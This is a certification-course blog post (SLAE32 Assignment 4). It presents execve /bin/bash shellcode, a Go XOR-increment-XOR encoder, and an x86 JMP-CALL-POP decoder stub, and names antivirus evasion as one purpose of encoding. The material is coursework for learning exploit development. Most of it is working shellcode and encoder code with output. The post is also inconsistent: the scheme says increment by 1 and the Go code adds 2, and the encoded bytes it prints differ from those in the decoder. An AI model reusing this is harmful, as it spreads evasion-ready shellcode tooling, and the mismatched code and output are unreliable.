---
title: SLAE32 - Assignment#4 [Encoder]
author: bigb0ss
date: 2021-04-21 23:53:00 +0800
categories: [SLAE32, Assignment_4_Encoder]
tags: [slae32, assembly, x86, Encoder]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#4 Github](https://github.com/bigb0sss/SLAE32)

# Assignement #4 
* Create a custom encoding scheme like the "Insertion Encoder"
* PoC with using execve-stack as the shellcode to encode with your schema and execute

# Custom Encoder
An encoder can be used fro various purposes. For example, Base64 encodes binary data into an ASCII characters which are known to pretty much every computer system. Or one may use an encoder to mangle their code to potentially bypass a security product such as AV. Today, I will demonstrate a simple custom econding scheme for a x86 shellcode. 

# Encoding Scheme
An encoding scheme we will use is:
1) XOR by 0x05
2) Increment by 1
3) XOR by 0x11

# Original Shellcode
I will be using the following `/bin/bash` shellcode as an original shellcode and apply a custom encoding to it. 

```nasm
; bash.nasm

global _start

section .text

_start:

	xor eax, eax		; Preparing Nulls in EAX register
	push eax			; Pushing the first Null DWORD
	
	; ////bin/bash (12 bytes) - "/" does not affect when running "/bin/bash" while being interpretated
	;
	; [Reverse order of ////bin/bash]
	; String length : 12
	; hsab : 68736162
	; /nib : 2f6e6962
	; //// : 2f2f2f2f
	
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f
	
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	
	; syscall()
	mov al, 0xb
	int 0x80
```

Using the compilerX86.py, we can retrieve the shellcode from the `bash.nasm` file.

```bash
# python compilerX86.py -f bash
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
 \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
                                                                                    |__|/ \|__|     [bigb0ss] v1.0         

[+] Assemble: bash.nasm
[+] Linking: bash.o
[+] Shellcode: "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
[+] ASM code: 0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x62,0x69,0x6e,0x2f,0x68,0x2f,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

# Encoder
As per our encoding scheme, we can encode the retrieved shellcode by using the following Go script. 

```go
package main

import "fmt"

func main() {

	// Hard-coded original shellcode
	shellcode := []byte{0x31, 0xc0, 0x50, 0x68, 0x62, 0x61, 0x73, 0x68, 0x68, 0x62, 0x69, 0x6e, 0x2f, 0x68, 0x2f, 0x2f, 0x2f, 0x2f, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}

	var key1 byte = 0x05 // 1st XOR value
	var key2 byte = 0x11 // 2nd XOR value

	encodedShellcode := make([]byte, len(shellcode))

	for i := range shellcode {

		xor1 := shellcode[i] ^ key1 // 1st XOR by 0x05
		inc := xor1 + 2             // Increment by 2
		xor2 := inc ^ key2          // 2nd XOR by 0x11
		encodedShellcode[i] = xor2
	}

	fmt.Printf("[INFO] Lengh: %v\n", len(encodedShellcode))
	fmt.Printf("[INFO] Encoded Shellcode: ")

	for c := 0; c < len(encodedShellcode); c++ {

		if encodedShellcode[c] < 16 { // Here to check if the Hex value is a single digit.

			fmt.Printf("0x0%x,", encodedShellcode[c])

		} else {

			fmt.Printf("0x%x,", encodedShellcode[c])
		}
	}
}
```

When we run the script, we can get the XOR-Increment-XOR encoded shellcode.

```bash
# go run encoder.go
[INFO] Lengh: 30
[INFO] Encoded Shellcode: 0x27,0xd6,0x46,0x7e,0x78,0x77,0x69,0x7e,0x7e,0x78,0x7f,0x7c,0x3d,0x7e,0x3d,0x3d,0x3d,0x3d,0x9f,0xf9,0x46,0x9f,0xf8,0x49,0x9f,0xf7,0xa6,0x01,0xdb,0x96,
```

# Decoder
Now let's create a decoder in ASM. We will introduce a technique called JMP-Call-POP to place the encoded shellcode in `ESI` register and start our decoding process. 

```nsam
; Executable name : decoder
; Version         : 1.0
; Created date    : 04/21/2021
; Last update     : 04/21/2021
; Author          : bigb0ss
; Description     : This is to run XOR-Increment-XOR decode for the "/bin/sh" shellcode
;

global _start

section .text

_start:

    jmp short call_decoder    ; JMP to "call_decoder" 

decoder:

    pop esi                   ; POPing "shellcode" on the ESI register
	xor ecx, ecx		      ; Zero out ECX
	xor edx, edx		      ; Zero out EDX
	mov dl, 30		     	  ; Move 30 (lengh of shellcode) to c low  
 
decode_loop:
	
	cmp ecx, edx		      ; Check if our loop is done for 30 times
	je encodedshellcode

    xor byte [esi], 0x11      ; 2nd XOR by 0x11
	dec byte [esi]		      ; Decrement by 1
	xor byte [esi], 0x05	  ; 1st XOR by 0x05

	inc esi
	inc ecx	
	jmp short decode_loop

call_decoder:

      call decoder                    ; CALL "decoder"
      encodedshellcode: db 0x24,0xd7,0x47,0x7f,0x79,0x74,0x66,0x7f,0x7f,0x79,0x7c,0x7d,0x3a,0x7f,0x3a,0x3a,0x3a,0x3a,0x9c,0xf6,0x47,0x9c,0xf9,0x46,0x9c,0xf4,0xa7,0x1e,0xd8,0x97
```

Finally, let's compile the `decoder.nasm` with complierX86.py again. 

```bash
# python compilerX86.py -f decoder
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
 \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
                                                                                    |__|/ \|__|     [bigb0ss] v1.0         

[+] Assemble: decoder.nasm
[+] Linking: decoder.o
[+] Shellcode: "\xeb\x17\x5e\x31\xc9\x31\xd2\xb2\x1e\x39\xd1\x74\x11\x80\x36\x11\xfe\x0e\x80\x36\x05\x46\x41\xeb\xf0\xe8\xe4\xff\xff\xff\x24\xd7\x47\x7f\x79\x74\x66\x7f\x7f\x79\x7c\x7d\x3a\x7f\x3a\x3a\x3a\x3a\x9c\xf6\x47\x9c\xf9\x46\x9c\xf4\xa7\x1e\xd8\x97"
[+] ASM code: 0xeb,0x17,0x5e,0x31,0xc9,0x31,0xd2,0xb2,0x1e,0x39,0xd1,0x74,0x11,0x80,0x36,0x11,0xfe,0x0e,0x80,0x36,0x05,0x46,0x41,0xeb,0xf0,0xe8,0xe4,0xff,0xff,0xff,0x24,0xd7,0x47,0x7f,0x79,0x74,0x66,0x7f,0x7f,0x79,0x7c,0x7d,0x3a,0x7f,0x3a,0x3a,0x3a,0x3a,0x9c,0xf6,0x47,0x9c,0xf9,0x46,0x9c,0xf4,0xa7,0x1e,0xd8,0x97
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

By running the compiled binary (`shellcode`), we can confirm the `decoder.nasm` successfully decode our XOR-Increment-XOR encoding scheme and run the expected command of `/bin/bash`.

```bash
# ./shellcode 
root@kali:/root# id
uid=0(root) gid=0(root) groups=0(root)
root@kali:/root#
```

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#4 Github](https://github.com/bigb0sss/SLAE32)